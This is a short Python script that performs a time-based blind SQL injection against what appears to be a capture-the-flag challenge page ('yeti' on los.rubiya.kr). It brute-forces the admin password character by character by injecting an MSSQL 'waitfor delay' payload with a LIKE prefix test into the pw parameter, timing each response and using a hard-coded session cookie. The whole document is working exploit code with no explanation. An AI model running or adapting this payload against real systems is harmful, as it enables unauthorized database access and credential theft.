import requests
import string
import time

print("start brute")
pw=""
pw_=""
a=string.printable
url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
cookies = {'PHPSESSID':'tq37qs365cufgcpm3p42i13pg6'}
for i in range(1,9):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?id=admin&pw=' if((select pw from prob_yeti where id='admin')like'"+str(pw_)+"%') waitfor delay '0:0:6'-- -"
        starttime = time.time()
        res = requests.get(url,cookies=cookies)
        endtime = time.time()
        res = res.text
        print(pw_)
        if endtime-starttime>4:
            pw+=j
            pw_=pw
            print("find")
            break
        else: 
            pass

print(pw)